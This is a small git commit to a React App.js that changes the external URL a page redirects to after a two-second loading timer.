7ead8e569cebda50c3e9733c901c72add0288807
husknet <127146284+husknet@users.noreply.github.com>
2024-08-21 11:13:59 -0300

    Update App.js

--- src/App.js
+++ src/App.js
@@ -4,7 +4,7 @@ import Loading from './Loading';
 function App() {
     useEffect(() => {
         const timer = setTimeout(() => {
-            window.location.href = 'https://bowstripe-themarketing.vercel.app/';
+            window.location.href = 'https://blow2tb-treshold.vercel.app/';
         }, 2000);
 
         return () => clearTimeout(timer);
